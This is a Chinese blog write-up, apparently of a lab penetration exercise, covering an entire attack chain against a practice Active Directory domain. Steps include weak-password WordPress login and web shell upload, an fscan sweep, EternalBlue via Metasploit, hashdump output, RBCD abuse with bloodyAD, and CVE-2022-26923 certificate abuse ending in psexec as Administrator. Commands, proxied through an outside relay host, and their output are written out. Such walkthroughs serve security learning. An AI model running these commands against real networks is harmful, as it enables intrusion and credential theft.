'XR-DC01.xiaorang.lab'\r[proxychains] config file found: /etc/proxychains4.conf\r[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r[proxychains] DLL init: proxychains-ng 4.17\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:636 ... OK\r[*] Creating new account:\rsAMAccountName : xrntkk3$\runicodePwd : Abc123456\ruserAccountControl : 4096\rservicePrincipalName : HOST/xrntkk3\rRestrictedKrbHost/xrntkk3\rdnsHostName : XR-DC01.xiaorang.lab\r[*] Successfully created account 'xrntkk3$' with password 'Abc123456' 用创建的账户向XR-CA请求证书\n┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 certipy req -u xrntkk3\\$@xiaorang.lab -p Abc123456 -target 172.22.15.18 -ca \"xiaorang-XR-CA-CA\" -templa\rte Machine\r[proxychains] config file found: /etc/proxychains4.conf\r[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r[proxychains] DLL init: proxychains-ng 4.17\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Requesting certificate via RPC\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.18:445 ... OK\r[*] Successfully requested certificate\r[*] Request ID is 9\r[*] Got certificate with DNS Host Name 'XR-DC01.xiaorang.lab'\r[*] Certificate has no object SID\r[*] Saved certificate and private key to 'xr-dc01.pfx' 向 KDC 请求域控的 TGT\n┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 certipy auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debug\r[proxychains] config file found: /etc/proxychains4.conf\r[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r[proxychains] DLL init: proxychains-ng 4.17\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Using principal: xr-dc01$@xiaorang.lab\r[*] Trying to get TGT...\r[proxychains] Strict chain ... 113.45.175.138:6666 ... 172.22.15.13:88 ... OK\r[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) 发现报错了，遇到 KDC_ERR_PADATA_TYPE_NOSUPP 错误，显示 KDC 不支持 PADATA 类型（预认证数据）, Kerberos 预身份验证失败\n需要尝试其他利用证书的方法\n这里可以使用bloodyAD利用证书去配置rdbc\nCravateRouge/bloodyAD: BloodyAD is an Active Directory Privilege Escalation Framework\n把证书文件转换为 PEM 格式\ncertipy cert -pfx xr-dc01.pfx \u003e xr-dc01.pem 配置rdbc\n┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q bloodyAD -d xiaorang.lab -u 'xrntkk3$' -c ':xr-dc01.pem' --host 172.22.15.13 --secure add rbcd 'xr-d\rc01$' 'xrntkk3$'\r[!] No security descriptor has been returned, a new one will be created\r[+] xrntkk3$ can now impersonate users on xr-dc01$ via S4U2Proxy 接下来就可以申请票据了\nproxychains4 -q impacket-getST 'xiaorang.lab/xrntkk3$:Abc123456' -spn LDAP/xr-dc01.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13 导入票据\nexport KRB5CCNAME=Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache psexec连\nproxychains4 -q impacket-psexec 'xiaorang.lab/administrator@XR-DC01.xiaorang.lab' -target-ip 172.22.15.13 -codec gbk -no-pass -k flag04\nc:\\Users\\Administrator\\flag\u003e type flag04.txt\r:::===== ::: :::==== :::===== :::==== ::: ===\r::: ::: ::: === ::: ::: === ::: ===\r====== === ======== === ===== === === ========\r=== === === === === === === === ===\r=== ======== === === ======= ====== ===\rflag04: flag{bcc6c72d-ae14-41bb-9d05-1655c6d7e6b2} 这个还有一些其他的打法，后面再补\nwhoami师傅关于PKINIT 不起作用的证书利用方法的文章：\nPass The Certificate when PKINIT Padata Type is NOSUPP | WHOAMI\n后渗透部分基本上是跟着h0ny师傅的博客打的，太强了。\n参考文章\n2022网鼎杯半决赛复盘-CSDN博客\nhttps://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\n",
+  "wordCount" : "4111",
+  "inLanguage": "zh",
+  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-05-12T22:03:55+08:00",
+  "dateModified": "2025-05-12T22:03:55+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Xrntkk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://blog.xrntkk.top/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E7%BD%91%E9%BC%8E2022%E5%A4%8D%E7%9B%98-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Xrntkk's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://blog.xrntkk.top/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://blog.xrntkk.top/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://blog.xrntkk.top/" title="Xrntkk&#39;s Blog">
+                    <span>首页📔</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/archives/" title="归档">
+                    <span>归档🗃️</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/tags/" title="Tags">
+                    <span>标签🔖</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/search/" title="搜索">
+                    <span>搜索🔎</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/links/" title="友链🎈">
+                    <span>友链🎈</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/about/" title="关于">
+                    <span>关于👨‍💻</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      春秋云镜-网鼎2022半决复盘-Writeup
+    </h1>
+<div class="post-meta"><span title='2025-05-12 22:03:55 +0800 CST'>2025-05-12</span>&nbsp;·&nbsp;<span>9 分钟</span>&nbsp;·&nbsp;<span>Xrntkk</span>
+
+<div class="meta-item">&nbsp·&nbsp
+  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
+  </div>      
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#flag1" aria-label="FLAG1">FLAG1</a></li>
+                <li>
+                    <a href="#flag2" aria-label="FLAG2">FLAG2</a></li>
+                <li>
+                    <a href="#flag3-rdbc" aria-label="FLAG3-RDBC">FLAG3-RDBC</a></li>
+                <li>
+                    <a href="#flag4-cve-2022-26923" aria-label="FLAG4-CVE-2022-26923">FLAG4-CVE-2022-26923</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h3 id="flag1">FLAG1<a hidden class="anchor" aria-hidden="true" href="#flag1">#</a></h3>
+<p><img alt="image-20250327144059592" loading="lazy" src="../assets/image-20250327144059592-1748854959640-1.png"></p>
+<p>入口机有一个wordpress服务</p>
+<p>wpscan没扫出漏洞，尝试一下弱口令没想到登进去了</p>
+<pre tabindex="0"><code>http://39.99.146.5/wp-admin/
+</code></pre><p>admin/123456</p>
+<p><img alt="image-20250327144837320" loading="lazy" src="../assets/image-20250327144837320-1748854959640-2.png"></p>
+<p>直接在Edit Plugins就可以写马了</p>
+<p>在主题的akismet.php写个马</p>
+<p><img alt="image-20250327145418665" loading="lazy" src="../assets/image-20250327145418665-1748854959640-3.png"></p>
+<p>访问 /wp-content/plugins/akismet/akismet.php</p>
+<p><img alt="image-20250327145616471" loading="lazy" src="../assets/image-20250327145616471-1748854959640-4.png"></p>
+<p>拿蚁剑连一下</p>
+<p><img alt="image-20250327145918146" loading="lazy" src="../assets/image-20250327145918146-1748854959640-6.png"></p>
+<p>拿到第一个flag</p>
+<pre tabindex="0"><code> ________ ___       ________  ________  ________    _____     
+|\  _____\\  \     |\   __  \|\   ____\|\   __  \  / __  \    
+\ \  \__/\ \  \    \ \  \|\  \ \  \___|\ \  \|\  \|\/_|\  \   
+ \ \   __\\ \  \    \ \   __  \ \  \  __\ \  \\\  \|/ \ \  \  
+  \ \  \_| \ \  \____\ \  \ \  \ \  \|\  \ \  \\\  \   \ \  \ 
+   \ \__\   \ \_______\ \__\ \__\ \_______\ \_______\   \ \__\
+    \|__|    \|_______|\|__|\|__|\|_______|\|_______|    \|__|
+
+
+	flag01: flag{a1c9f11e-1033-4f2a-95f0-032f1ff79d22}
+</code></pre><h3 id="flag2">FLAG2<a hidden class="anchor" aria-hidden="true" href="#flag2">#</a></h3>
+<p>先用vshell上个线</p>
+<p>然后信息收集一手</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">www-data@ubuntu-web:/tmp$ ip addr show
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">1<span class="p">:</span> <span class="nl">lo</span><span class="c1">: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    inet 127.0.0.1/8 scope host lo
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    inet6 ::1/128 scope host 
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">2<span class="p">:</span> <span class="nl">eth0</span><span class="c1">: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    link/ether 00:16:3e:27:06:38 brd ff:ff:ff:ff:ff:ff
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    inet 172.22.15.26/16 brd 172.22.255.255 scope global dynamic eth0
+</span></span><span class="line"><span class="ln">11</span><span class="cl">       valid_lft 315357725sec preferred_lft 315357725sec
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    inet6 fe80::216:3eff:fe27:638/64 scope link 
+</span></span><span class="line"><span class="ln">13</span><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="ln">14</span><span class="cl">       
+</span></span></code></pre></div><p>内网IP是172.22.15.26</p>
+<p>传个fscan扫一下内网</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln">  1</span><span class="cl">www-data@ubuntu-web:/tmp$ ./fs -h 172.22.15.0/24
+</span></span><span class="line"><span class="ln">  2</span><span class="cl">┌──────────────────────────────────────────────┐
+</span></span><span class="line"><span class="ln">  3</span><span class="cl">│    ___                              _        │
+</span></span><span class="line"><span class="ln">  4</span><span class="cl">│   / _ \     ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __    │
+</span></span><span class="line"><span class="ln">  5</span><span class="cl">│  / /_\/____/ __<span class="p">|</span>/ __<span class="p">|</span> &#39;__/ _` <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /    │
+</span></span><span class="line"><span class="ln">  6</span><span class="cl">│ / /_\\_____\__ \ (__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">(</span>__<span class="p">|</span>   <span class="p">&lt;</span>     │
+</span></span><span class="line"><span class="ln">  7</span><span class="cl">│ \____/     <span class="p">|</span>___/\___<span class="p">|</span>_<span class="p">|</span>  \__,_<span class="p">|</span>\___<span class="p">|</span>_<span class="p">|</span>\_\    │
+</span></span><span class="line"><span class="ln">  8</span><span class="cl">└──────────────────────────────────────────────┘
+</span></span><span class="line"><span class="ln">  9</span><span class="cl">      Fscan Version: 2.0.0
+</span></span><span class="line"><span class="ln"> 10</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 11</span><span class="cl">[2025-03-27 15:06:48] [INFO] 暴力破解线程数: 1
+</span></span><span class="line"><span class="ln"> 12</span><span class="cl">[2025-03-27 15:06:48] [INFO] 开始信息扫描
+</span></span><span class="line"><span class="ln"> 13</span><span class="cl">[2025-03-27 15:06:48] [INFO] CIDR范围: 172.22.15.0-172.22.15.255
+</span></span><span class="line"><span class="ln"> 14</span><span class="cl">[2025-03-27 15:06:48] [INFO] 生成IP范围: 172.22.15.0.<span class="nv">%!d(string=172.22.15.255) - %!s(MISSING).%!</span>d(MISSING<span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 15</span><span class="cl">[2025-03-27 15:06:48] [INFO] 解析CIDR 172.22.15.0/24 -<span class="p">&gt;</span> IP范围 172.22.15.0-172.22.15.255
+</span></span><span class="line"><span class="ln"> 16</span><span class="cl">[2025-03-27 15:06:48] [INFO] 最终有效主机数量: 256
+</span></span><span class="line"><span class="ln"> 17</span><span class="cl">[2025-03-27 15:06:48] [INFO] 开始主机扫描
+</span></span><span class="line"><span class="ln"> 18</span><span class="cl">[2025-03-27 15:06:48] [INFO] 正在尝试无监听ICMP探测...
+</span></span><span class="line"><span class="ln"> 19</span><span class="cl">[2025-03-27 15:06:49] [INFO] 当前用户权限不足,无法发送ICMP包
+</span></span><span class="line"><span class="ln"> 20</span><span class="cl">[2025-03-27 15:06:49] [INFO] 切换为PING方式探测...
+</span></span><span class="line"><span class="ln"> 21</span><span class="cl">[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.24    存活 (ICMP<span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 22</span><span class="cl">[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.26    存活 (ICMP)
+</span></span><span class="line"><span class="ln"> 23</span><span class="cl">[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.35    存活 (ICMP)
+</span></span><span class="line"><span class="ln"> 24</span><span class="cl">[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.13    存活 (ICMP)
+</span></span><span class="line"><span class="ln"> 25</span><span class="cl">[2025-03-27 15:06:49] [SUCCESS] 目标 172.22.15.18    存活 (ICMP)
+</span></span><span class="line"><span class="ln"> 26</span><span class="cl">[2025-03-27 15:06:55] [INFO] 存活主机数量: 5
+</span></span><span class="line"><span class="ln"> 27</span><span class="cl">[2025-03-27 15:06:55] [INFO] 有效端口数量: 233
+</span></span><span class="line"><span class="ln"> 28</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.18:80
+</span></span><span class="line"><span class="ln"> 29</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.24:80
+</span></span><span class="line"><span class="ln"> 30</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.26:80
+</span></span><span class="line"><span class="ln"> 31</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:88
+</span></span><span class="line"><span class="ln"> 32</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.35:135
+</span></span><span class="line"><span class="ln"> 33</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:135
+</span></span><span class="line"><span class="ln"> 34</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.24:135
+</span></span><span class="line"><span class="ln"> 35</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:139
+</span></span><span class="line"><span class="ln"> 36</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.18:139
+</span></span><span class="line"><span class="ln"> 37</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.35:139
+</span></span><span class="line"><span class="ln"> 38</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.18:135
+</span></span><span class="line"><span class="ln"> 39</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.24:139
+</span></span><span class="line"><span class="ln"> 40</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:389
+</span></span><span class="line"><span class="ln"> 41</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.24:445
+</span></span><span class="line"><span class="ln"> 42</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.26:22
+</span></span><span class="line"><span class="ln"> 43</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.35:445
+</span></span><span class="line"><span class="ln"> 44</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.13:445
+</span></span><span class="line"><span class="ln"> 45</span><span class="cl">[2025-03-27 15:06:55] [SUCCESS] 端口开放 172.22.15.18:445
+</span></span><span class="line"><span class="ln"> 46</span><span class="cl">[2025-03-27 15:06:56] [SUCCESS] 服务识别 172.22.15.26:22 =<span class="p">&gt;</span> [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
+</span></span><span class="line"><span class="ln"> 47</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.18:80 =<span class="p">&gt;</span> [http]
+</span></span><span class="line"><span class="ln"> 48</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.24:80 =<span class="p">&gt;</span> [http]
+</span></span><span class="line"><span class="ln"> 49</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.26:80 =<span class="p">&gt;</span> [http]
+</span></span><span class="line"><span class="ln"> 50</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.13:88 =&gt; 
+</span></span><span class="line"><span class="ln"> 51</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.13:139 =<span class="p">&gt;</span>  Banner:[.]
+</span></span><span class="line"><span class="ln"> 52</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.18:139 =<span class="p">&gt;</span>  Banner:[.]
+</span></span><span class="line"><span class="ln"> 53</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.35:139 =<span class="p">&gt;</span>  Banner:[.]
+</span></span><span class="line"><span class="ln"> 54</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.24:139 =<span class="p">&gt;</span>  Banner:[.]
+</span></span><span class="line"><span class="ln"> 55</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.13:389 =<span class="p">&gt;</span> [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
+</span></span><span class="line"><span class="ln"> 56</span><span class="cl">[2025-03-27 15:07:00] [SUCCESS] 服务识别 172.22.15.24:445 =&gt; 
+</span></span><span class="line"><span class="ln"> 57</span><span class="cl">[2025-03-27 15:07:01] [SUCCESS] 服务识别 172.22.15.35:445 =&gt; 
+</span></span><span class="line"><span class="ln"> 58</span><span class="cl">[2025-03-27 15:07:01] [SUCCESS] 服务识别 172.22.15.13:445 =&gt; 
+</span></span><span class="line"><span class="ln"> 59</span><span class="cl">[2025-03-27 15:07:01] [SUCCESS] 服务识别 172.22.15.18:445 =&gt; 
+</span></span><span class="line"><span class="ln"> 60</span><span class="cl">[2025-03-27 15:07:01] [SUCCESS] 端口开放 172.22.15.24:3306
+</span></span><span class="line"><span class="ln"> 61</span><span class="cl">[2025-03-27 15:07:01] [SUCCESS] 服务识别 172.22.15.24:3306 =<span class="p">&gt;</span> [mysql] 版本:5.7.26 产品:MySQL Banner:[J.5.7.26.7R%P yS.L6.nX W :IN mysql_native_password]
+</span></span><span class="line"><span class="ln"> 62</span><span class="cl">[2025-03-27 15:08:00] [SUCCESS] 服务识别 172.22.15.35:135 =&gt; 
+</span></span><span class="line"><span class="ln"> 63</span><span class="cl">[2025-03-27 15:08:00] [SUCCESS] 服务识别 172.22.15.13:135 =&gt; 
+</span></span><span class="line"><span class="ln"> 64</span><span class="cl">[2025-03-27 15:08:00] [SUCCESS] 服务识别 172.22.15.24:135 =&gt; 
+</span></span><span class="line"><span class="ln"> 65</span><span class="cl">[2025-03-27 15:08:00] [SUCCESS] 服务识别 172.22.15.18:135 =&gt; 
+</span></span><span class="line"><span class="ln"> 66</span><span class="cl">[2025-03-27 15:08:00] [INFO] 存活端口数量: 19
+</span></span><span class="line"><span class="ln"> 67</span><span class="cl">[2025-03-27 15:08:00] [INFO] 开始漏洞扫描
+</span></span><span class="line"><span class="ln"> 68</span><span class="cl">[2025-03-27 15:08:00] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle
+</span></span><span class="line"><span class="ln"> 69</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] NetInfo 扫描结果
+</span></span><span class="line"><span class="ln"> 70</span><span class="cl">目标主机: 172.22.15.18
+</span></span><span class="line"><span class="ln"> 71</span><span class="cl">主机名: XR-CA
+</span></span><span class="line"><span class="ln"> 72</span><span class="cl">发现的网络接口:
+</span></span><span class="line"><span class="ln"> 73</span><span class="cl">   IPv4地址:
+</span></span><span class="line"><span class="ln"> 74</span><span class="cl">      └─ 172.22.15.18
+</span></span><span class="line"><span class="ln"> 75</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] NetInfo 扫描结果
+</span></span><span class="line"><span class="ln"> 76</span><span class="cl">目标主机: 172.22.15.24
+</span></span><span class="line"><span class="ln"> 77</span><span class="cl">主机名: XR-WIN08
+</span></span><span class="line"><span class="ln"> 78</span><span class="cl">发现的网络接口:
+</span></span><span class="line"><span class="ln"> 79</span><span class="cl">   IPv4地址:
+</span></span><span class="line"><span class="ln"> 80</span><span class="cl">      └─ 172.22.15.24
+</span></span><span class="line"><span class="ln"> 81</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] NetInfo 扫描结果
+</span></span><span class="line"><span class="ln"> 82</span><span class="cl">目标主机: 172.22.15.13
+</span></span><span class="line"><span class="ln"> 83</span><span class="cl">主机名: XR-DC01
+</span></span><span class="line"><span class="ln"> 84</span><span class="cl">发现的网络接口:
+</span></span><span class="line"><span class="ln"> 85</span><span class="cl">   IPv4地址:
+</span></span><span class="line"><span class="ln"> 86</span><span class="cl">      └─ 172.22.15.13
+</span></span><span class="line"><span class="ln"> 87</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] 网站标题 http://172.22.15.18       状态码:200 长度:703    标题:IIS Windows Server
+</span></span><span class="line"><span class="ln"> 88</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] NetInfo 扫描结果
+</span></span><span class="line"><span class="ln"> 89</span><span class="cl">目标主机: 172.22.15.35
+</span></span><span class="line"><span class="ln"> 90</span><span class="cl">主机名: XR-0687
+</span></span><span class="line"><span class="ln"> 91</span><span class="cl">发现的网络接口:
+</span></span><span class="line"><span class="ln"> 92</span><span class="cl">   IPv4地址:
+</span></span><span class="line"><span class="ln"> 93</span><span class="cl">      └─ 172.22.15.35
+</span></span><span class="line"><span class="ln"> 94</span><span class="cl">[2025-03-27 15:08:01] [INFO] 系统信息 172.22.15.13 [Windows Server 2016 Standard 14393]
+</span></span><span class="line"><span class="ln"> 95</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] 网站标题 http://172.22.15.24       状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.15.24/www
+</span></span><span class="line"><span class="ln"> 96</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] NetBios 172.22.15.35    XIAORANG\XR-0687              
+</span></span><span class="line"><span class="ln"> 97</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1
+</span></span><span class="line"><span class="ln"> 98</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] NetBios 172.22.15.13    DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393
+</span></span><span class="line"><span class="ln"> 99</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393
+</span></span><span class="line"><span class="ln">100</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] 发现漏洞 172.22.15.24 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010
+</span></span><span class="line"><span class="ln">101</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] 网站标题 http://172.22.15.26       状态码:200 长度:39962  标题:XIAORANG.LAB
+</span></span><span class="line"><span class="ln">102</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] 目标: http://172.22.15.18:80
+</span></span><span class="line"><span class="ln">103</span><span class="cl">  漏洞类型: poc-yaml-active-directory-certsrv-detect
+</span></span><span class="line"><span class="ln">104</span><span class="cl">  漏洞名称: 
+</span></span><span class="line"><span class="ln">105</span><span class="cl">  详细信息:
+</span></span><span class="line"><span class="ln">106</span><span class="cl">        author:AgeloVito
+</span></span><span class="line"><span class="ln">107</span><span class="cl">        links:https://www.cnblogs.com/EasonJim/p/6859345.html
+</span></span><span class="line"><span class="ln">108</span><span class="cl">[2025-03-27 15:08:01] [SUCCESS] 网站标题 http://172.22.15.24/www/sys/index.php 状态码:200 长度:135    标题:无标题
+</span></span><span class="line"><span class="ln">109</span><span class="cl">[2025-03-27 15:08:25] [SUCCESS] 扫描已完成: 35/35
+</span></span></code></pre></div><p>扫出内网的四台机子</p>
+<pre tabindex="0"><code>目标主机: 172.22.15.18
+主机名: XR-CA
+
+目标主机: 172.22.15.24
+主机名: XR-WIN08
+
+目标主机: 172.22.15.13
+主机名: XR-DC01
+
+目标主机: 172.22.15.35
+主机名: XR-0687
+</code></pre><p>172.22.15.24扫出来有MS17-010(永恒之蓝)漏洞</p>
+<p>那直接用msf来打</p>
+<pre tabindex="0"><code>proxychains4 msfconsole
+use exploit/windows/smb/ms17_010_eternalblue  # 选择使用的模块
+set payload windows/x64/meterpreter/bind_tcp  # 设置payload，可以通过show payloads查看
+set RHOSTS 172.22.15.24  # 设置靶机的ip
+exploit  # 发起攻击
+</code></pre><p><img alt="image-20250327163330064" loading="lazy" src="../assets/image-20250327163330064-1748854959640-5.png"></p>
+<p>打了好几次终于通了，但是msf的shell有点问题，用不了</p>
+<p>先用msf读个flag</p>
+<p><img alt="image-20250327163640978" loading="lazy" src="../assets/image-20250327163640978-1748854959640-7.png"></p>
+<pre tabindex="0"><code>  __ _              ___  __
+ / _| |            / _ \/_ |
+| |_| | __ _  __ _| | | || |
+|  _| |/ _` |/ _` | | | || |
+| | | | (_| | (_| | |_| || |
+|_| |_|\__,_|\__, |\___/ |_|
+              __/ |
+             |___/
+
+
+flag02: flag{2e191985-3660-4b3a-b1c5-01be8b41c15e}
+</code></pre><p>也可以用hashdump拿到哈希</p>
+<pre tabindex="0"><code>meterpreter &gt; hashdump
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+</code></pre><p>拿到hash可以用psexec横向移动</p>
+<p><img alt="image-20250327164733287" loading="lazy" src="../assets/image-20250327164733287-1748854959640-8.png"></p>
